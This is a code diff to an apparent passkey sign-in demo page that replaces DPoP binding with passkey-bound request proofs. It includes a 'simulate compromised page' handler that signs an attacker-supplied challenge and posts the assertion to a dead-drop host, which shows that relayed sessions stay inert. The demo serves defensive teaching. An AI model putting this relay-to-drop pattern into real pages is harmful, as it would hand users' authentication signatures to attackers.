@@ -36,7 +36,7 @@
 
   <div id="login">
     <h1>Sign in</h1>
-    <p class="sub">Passkey + DPoP. The session is bound to a key this browser keeps.</p>
+    <p class="sub">Passkey-bound. The session is bound to your passkey; each request needs a fresh tap.</p>
     <button id="go">Sign in with passkey</button>
     <button id="evil" class="evil" title="Models an XSS'd page relaying your signature to the attacker">Simulate compromised page (relay my sign-in)</button>
     <div id="status" class="status"></div>
@@ -51,12 +51,12 @@
 
   <div id="home" class="home">
     <div class="avatar" id="hinit">?</div>
-    <div>Signed in <span class="ok">&#10003;</span> (DPoP-bound)</div>
+    <div>Signed in <span class="ok">&#10003;</span> (passkey-bound)</div>
     <div class="big" id="hname">Welcome</div>
     <div class="pill" id="hjkt"></div>
   </div>
 
-  <div class="foot">Secured with passkeys + DPoP &middot; sender-constrained sessions</div>
+  <div class="foot">Secured with passkeys &middot; passkey-bound sessions</div>
 </div>
 
 <script type="module">
@@ -66,7 +66,7 @@ const $ = (id) => document.getElementById(id);
 const DROP = (new URLSearchParams(location.search).get('drop')) || 'http://127.0.0.1:1423';
 const post = (u, body) => fetch(u, { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body||{}) });
 
-// Enroll: create account + register a DPoP-bound passkey on this origin.
+// Enroll: create account + register a passkey on this origin.
 $('enroll').onclick = async () => {
   const username = $('username').value.trim();
   if (!username) { $('setupStatus').textContent = 'Enter a username.'; return; }
@@ -81,36 +81,39 @@ $('enroll').onclick = async () => {
   } catch (e) { $('setupStatus').textContent = 'Setup failed: ' + (e.message || e); $('enroll').disabled = false; }
 };
 
-// Legit defended sign-in: authenticate, then fetch the protected resource WITH a DPoP proof.
+const b64urlStr = (s) => btoa(unescape(encodeURIComponent(s))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+
+// Legit defended sign-in: authenticate, then read the protected resource with a fresh passkey
+// proof-of-possession assertion (a second tap). The session is bound to the passkey.
 $('go').onclick = async () => {
   $('go').disabled = true; $('status').textContent = 'Signing in…';
   try {
     const start = await (await post('/login/start', {})).json();
     $('status').textContent = 'Approve the passkey prompt…';
     const out = await provider.authenticate(start);
-    const fin = await (await post('/login/finish', { assertion: out.assertion, dpopPublicJwk: out.dpopPublicJwk })).json();
+    const fin = await (await post('/login/finish', { assertion: out.assertion })).json();
     if (!fin.ok) throw new Error(fin.error || 'login failed');
-    // Use the token: the resource server requires a DPoP proof bound to this browser's key.
+    // Exercise the token: /api/me needs a passkey proof signed by the bound credential.
     const htu = location.origin + '/api/me';
-    const me = await (await fetch(htu, { headers: { authorization: 'DPoP ' + fin.token, dpop: await provider.dpopProof('GET', htu) } })).json();
+    const proof = b64urlStr(JSON.stringify(await provider.prove('GET', htu)));
+    const me = await (await fetch(htu, { headers: { authorization: 'Passkey ' + fin.token, 'x-passkey-proof': proof } })).json();
     $('hinit').textContent = (String(me.displayName||'?').trim()[0] || '?').toUpperCase();
     $('hname').textContent = 'Welcome, ' + (me.displayName || me.username || 'you');
-    $('hjkt').textContent = 'bound jkt: ' + me.jkt;
+    $('hjkt').textContent = 'bound to passkey: ' + me.jkt;
     $('login').style.display = 'none'; $('home').style.display = 'block';
   } catch (e) { $('status').textContent = 'Sign-in failed: ' + (e.message || e); $('go').disabled = false; }
 };
 
 // Models the XSS'd page from the attack demo: sign the ATTACKER's offered nonce and hand the
-// assertion (plus our DPoP public key) to the dead-drop. We can leak the public key, but the
-// private key is non-extractable -- it never leaves this browser -- so the relayed session
-// cannot be exercised by anyone else.
+// assertion to the dead-drop. There is no page-held key to leak: the signing key lives in the
+// authenticator, so the relayed login mints a session the attacker's machine cannot exercise.
 $('evil').onclick = async () => {
   $('evil').disabled = true; $('status').textContent = 'Relaying sign-in to attacker…';
   try {
     const off = await (await fetch(DROP + '/x/offer')).json();
     if (!off.challenge) { $('status').textContent = 'No attacker offer waiting. Open the attacker tab first.'; $('evil').disabled = false; return; }
     const out = await provider.authenticate({ challenge: off.challenge, rpId: off.rpId });
-    await post(DROP + '/x/assertion', { assertion: out.assertion, dpopPublicJwk: out.dpopPublicJwk });
+    await post(DROP + '/x/assertion', { assertion: out.assertion });
     $('status').innerHTML = 'Signature relayed. Watch the attacker tab: the login completes but the session is <b>inert</b>.';
     $('evil').disabled = false;
   } catch (e) { $('status').textContent = 'Relay failed: ' + (e.message || e); $('evil').disabled = false; }
